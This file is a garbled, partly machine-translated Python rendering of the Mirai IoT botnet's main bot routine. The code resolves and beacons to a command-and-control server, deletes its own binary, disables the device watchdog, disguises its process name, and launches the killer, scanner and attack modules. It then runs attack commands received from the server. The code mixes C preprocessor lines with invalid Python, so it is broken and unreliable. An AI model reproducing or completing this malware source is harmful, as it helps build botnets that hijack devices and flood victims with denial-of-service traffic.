import os, errno, fcntl
import sys
#endif
#include <unistd.h>
import socket
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
import time
#include <errno.h>
import attack_app, attack_gre, attack_tcp, attack_udp, checksum, killer, util, rand, resolv, scanner, table

DEBUG = True
# class static_methods(object):
@staticmethod
def anti_gdb_entry(sig):
    resolve_func = resolve_cnc_addr

@staticmethod
def resolve_cnc_addr():
    # struct resolv_entries *entries
    class resolv_entries(object):
        def __init__(self, entries):
            self.entries = entries

    table_unlock_val(TABLE_CNC_DOMAIN)
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL))
    table_lock_val(TABLE_CNC_DOMAIN)
    if entries == NULL:
        if DEBUG == True:
                printf("[main] Failed to resolve CNC address\n")
        #endif
                return
    srv_addr.sin_addr.s_addr = entries.addrs[rand_next() % entries.addrs_len]
    resolv_entries_free(entries)

    table_unlock_val(TABLE_CNC_PORT)
    # srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL))
    srv_addr.sin_port = port_t(table_retrieve_val(TABLE_CNC_PORT, NULL))
    table_lock_val(TABLE_CNC_PORT)

    if DEBUG == True:
        printf("[main] Resolved domain\n")
    #endif

@staticmethod
def establish_connection():
    if DEBUG == True:
        printf("[main] Attempting to connect to CNC\n")
    #endif
    fd_serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    if fd_serv == -1:
    # if (fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1:
        if DEBUG == True:
                printf("[main] Failed to call socket(). Errno = %d\n" % (errno))
        #endif
                return

        fcntl.fcntl(fd_serv, F_SETFL, os.O_NONBLOCK | fcntl.fcntl(fd_serv, F_GETFL, 0))

            # Should call resolve_cnc_addr
        if resolve_func != NULL:
            resolve_func()

            pending_connection = True
        # connect(fd_serv, (# struct sockaddr *)srv_addr, sizeof (# struct sockaddr_in))
        connect(fd_serv, sockaddr(srv_addr, len.sockaddr_in))
@staticmethod
def teardown_connection():
    if DEBUG == True:
        printf("[main] Tearing down connection to CNC!\n")
    #endif

    if fd_serv != -1:
        os.close(fd_serv)
    fd_serv = -1
    sleep(1)
@staticmethod
def ensure_single_instance():
    @staticmethod
    def local_bind():
        return True
        # struct sockaddr_in addr
        sockaddr_in(addr)
        opt = 1

    fd_ctrl = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
    if fd_ctrl == -1:
        return
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, opt, sizeof (int))
    fcntl.fcntl(fd_ctrl, F_SETFL, os.O_NONBLOCK | fcntl.fcntl(fd_ctrl, F_GETFL, 0))

    addr.sin_family = AF_INET
    # addr.sin_addr.s_addr = local_bind
    try:
        local_bind = INET_ADDR(127,0,0,1)
        # (INET_ADDR(127,0,0,1)) : LOCAL_ADDR
    except Exception:
        local_bind = LOCAL_ADDR
    addr.sin_addr.s_addr = local_bind

    addr.sin_port = htons(SINGLE_INSTANCE_PORT)

    # Try to bind to the control port
    errno = 0
    #if bind(fd_ctrl, (# struct sockaddr *)addr, sizeof (# struct sockaddr_in)) == -1:
    if bind(fd_ctrl, (sockaddr(addr),len.sockaddr_in)) == -1:
        if errno == errno.EADDRNOTAVAIL and local_bind:
            local_bind = False
            if DEBUG == True:
                    printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n" % (errno))
            #endif

        # Reset addr just in case
        addr.sin_family = AF_INET
        addr.sin_addr.s_addr = INADDR_ANY
        addr.sin_port = htons(SINGLE_INSTANCE_PORT)

        # if connect(fd_ctrl, (# struct sockaddr *)addr, sizeof (# struct sockaddr_in)) == -1:
        if connect(fd_ctrl, sockaddr(addr), len.sockaddr_in) == -1:
            if DEBUG == True:
                        printf("[main] Failed to connect to fd_ctrl to request process termination\n")


# # struct sockaddr_in srv_addr

class sockaddr_in(object):
    def __init__(self, srv_addr):
        self.srv_addr = srv_addr
fd_ctrl = -1; fd_serv = -1
pending_connection = False

resolv_func = util_local_addr()
# (*resolve_func)() = ((*)())util_local_addr # Overridden in anti_gdb_entry


if DEBUG == True:
    def segv_handler(sig, siginfo_t, si, unused):
        # printf("Got SIGSEGV at address: 0x%lx\n" % ((long) si.si_addr))
        s = "Got SIGSEGV at address: 0x{}\n".format(
            str(si.si_addr)
        )
        print s
        os.exit(EXIT_FAILURE)
#endif

def main(argc, args):
    pings = 0
    sigset_t(sigs)
    # Delete self
    os.unlink(args[0])
    # Signal based control flow
    sigemptyset(sigs)
    sigaddset(sigs, SIGINT)
    sigprocmask(SIG_BLOCK, sigs, NULL)
    signal(SIGCHLD, SIG_IGN)
    signal(SIGTRAP, anti_gdb_entry)

    # Prevent watchdog from rebooting device
    if ((os.open("/dev/watchdog", 2)) != -1 or (os.open("/dev/misc/watchdog", 2)) != -1):
        if os.open("/dev/watchdog", 2) != -1:
            wfd = os.open("/dev/watchdog", 2)
        if os.open("/dev/misc/watchdog", 2) != -1:
            wfd = os.open("/dev/misc/watchdog", 2)
        one = 1
        ioctl(wfd, 0x80045704, one)
        os.close(wfd)
        wfd = 0
    os.chdir("/")
#endif

    if DEBUG == True:
        printf("DEBUG MODE YO\n")

        sleep(1)

    # struct sigaction sa
    class sigaction(object):
        def __init__(self, sa):
            self.sa = sa
    sa.sa_flags = SA_SIGINFO
    sigemptyset(sa.sa_mask)
    sa.sa_sigaction = segv_handler
    if sigaction(SIGSEGV, sa, NULL) == -1:
        perror("sigaction")

    sa.sa_flags = SA_SIGINFO
    sigemptyset(sa.sa_mask)
    sa.sa_sigaction = segv_handler
    if sigaction(SIGBUS, sa, NULL) == -1:
        perror("sigaction")
#endif

    LOCAL_ADDR = util_local_addr()

    srv_addr.sin_family = AF_INET
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR
    srv_addr.sin_port = htons(FAKE_CNC_PORT)

    if DEBUG == True:
        unlock_tbl_if_nodebug(args[0])
        anti_gdb_entry(0)
#else
    if unlock_tbl_if_nodebug(args[0]):
        raise(SIGTRAP)
#endif

    ensure_single_instance()

    rand_init()

    util_zero(id_buf, 32)
    if argc == 2 and util_strlen(args[1]) < 32:
        util_strcpy(id_buf, args[1])
        util_zero(args[1], util_strlen(args[1]))

    # Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4
    rand_alphastr(name_buf, name_buf_len)
    name_buf[name_buf_len] = 0
    util_strcpy(args[0], name_buf)

    # Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4
    rand_alphastr(name_buf, name_buf_len)
    name_buf[name_buf_len] = 0
    prctl(PR_SET_NAME, name_buf)

    # Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS)
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, tbl_exec_succ_len)
    os.write(STDOUT, tbl_exec_succ, tbl_exec_succ_len)
    os.write(STDOUT, "\n", 1)
    table_lock_val(TABLE_EXEC_SUCCESS)

#ifndef DEBUG
    if os.fork() > 0:
        return 0
    pgid = os.setsid()
    os.close(STDIN)
    os.close(STDOUT)
    os.close(STDERR)
#endif

    attack_init()
    killer_init()
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init()
#endif
#endif

    while True:
        # fd_set fdsetrd, fdsetwr, fdsetex
        fd_set(fdsetrd, fdsetwr, fdsetex)
        class timeval(object):
            def __init__(self,timeval, timeo):
                self.timeval = timeval
                self.timeo = timeo
        # # struct timeval timeo

        FD_ZERO(fdsetrd)
        FD_ZERO(fdsetwr)

        # Socket for accept()
        if fd_ctrl != -1:
            FD_SET(fd_ctrl, fdsetrd)

        # Set up CNC sockets
        if fd_serv == -1:
            establish_connection()

        if pending_connection:
            FD_SET(fd_serv, fdsetwr)
        else:
            FD_SET(fd_serv, fdsetrd)

        # Get maximum FD for select
        if fd_ctrl > fd_serv:
            mfd = fd_ctrl
        else:
            mfd = fd_serv

        # Wait 10s in call to select()
        timeo.tv_usec = 0
        timeo.tv_sec = 10
        nfds = select(mfd + 1, fdsetrd, fdsetwr, NULL, timeo)
        if nfds == -1:
            if DEBUG == True:
                s = "select() errno = %d\n".format(int(errno))
                print s
    # printf("select() errno = %d\n" % (errno))
#endif
            continue
        elif nfds == 0:
            len = 0

        if (pings + 1) % 6 == 0:
            send(fd_serv, len, sizeof (len), MSG_NOSIGNAL)

        # Check if we need to kill ourselves
        if fd_ctrl != -1 and FD_ISSET(fd_ctrl, fdsetrd):
            # struct sockaddr_in cli_addr
            sockaddr_in(cli_addr)
            # socklen_t cli_addr_len = sizeof (cli_addr)
            socklen_t(cli_addr_len) = sizeof(cli_addr)

            # accept(fd_ctrl, (# struct sockaddr *)cli_addr, cli_addr_len)
            accept(fd_ctrl, sockaddr(cli_addr, cli_addr_len))

    if DEBUG == True:
                printf("[main] Detected newer instance running! Killing self\n")
        #endif
        #ifdef MIRAI_TELNET
                scanner_kill()
    #endif
                killer_kill()
                attack_kill_all()
                os.kill(pgid * -1, 9)
                os.exit(0)

            # Check if CNC connection was established or timed out or errored
    if pending_connection:
        pending_connection = False

    if not FD_ISSET(fd_serv, fdsetwr):
        if DEBUG == True:
                        printf("[main] Timed out while connecting to CNC\n")
        #endif
                        teardown_connection()
        else:
            err = 0
            # socklen_t err_len = sizeof (err)
            socklen_t(err_len) = sizeof (err)

            getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, err, err_len)
            if err != 0:
                if DEBUG == True:
                        printf("[main] Error while connecting to CNC code=%d\n" % (err))
    #endif
                        os.close(fd_serv)
                        fd_serv = -1
                        sleep((rand_next() % 10) + 1)
                else:
                    id_len = util_strlen(id_buf)

                    LOCAL_ADDR = util_local_addr()
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL)
                    send(fd_serv, id_len, sizeof (id_len), MSG_NOSIGNAL)
                    if id_len > 0:
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL)
        if DEBUG == True:
                            printf("[main] Connected to CNC. Local address = %d\n" % (LOCAL_ADDR))
        #endif
        elif fd_serv != -1 and FD_ISSET(fd_serv, fdsetrd):

            # Try to read in buffer length from CNC
            errno = 0
            n = recv(fd_serv, len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK)
            if n == -1:
                if errno == errno.EWOULDBLOCK or errno == errno.EAGAIN or errno == errno.EINTR:
                    continue
                else:
                    n = 0 # Cause connection to close

            # If n == 0 then we close the connection!
            if n == 0:
                if DEBUG == True:
                    printf("[main] Lost connection with CNC (errno = %d) 1\n" % (errno))
                    #endif
                    teardown_connection()
                    continue

                    # Convert length to network order and sanity check length
                    if len == 0: # If it is just a ping, no need to try to read in buffer data
                    #{
                        recv(fd_serv, len, sizeof (len), MSG_NOSIGNAL) # skip buffer for length
                        continue
                    len = ntohs(len)
                    if len > sizeof (rdbuf):
                        os.close(fd_serv)
                        fd_serv = -1

                    # Try to read in buffer from CNC
                    errno = 0
                    n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK)
                    if n == -1:
                        if errno == errno.EWOULDBLOCK or errno == errno.EAGAIN or errno == errno.EINTR:
                            continue
                        else:
                            n = 0

                    # If n == 0 then we close the connection!
                    if n == 0:
                        if DEBUG == True:
                                        printf("[main] Lost connection with CNC (errno = %d) 2\n" % (errno))
                        #endif
                                        teardown_connection()
                                        continue

                    # Actually read buffer length and buffer data
                    recv(fd_serv, len, sizeof (len), MSG_NOSIGNAL)
                    len = ntohs(len)
                    recv(fd_serv, rdbuf, len, MSG_NOSIGNAL)

        if DEBUG == True:
            printf("[main] Received %d bytes from CNC\n" % (len))
            #endif

            if len > 0:
                attack_parse(rdbuf, len)

            return 0
main(argc,args)

#endif
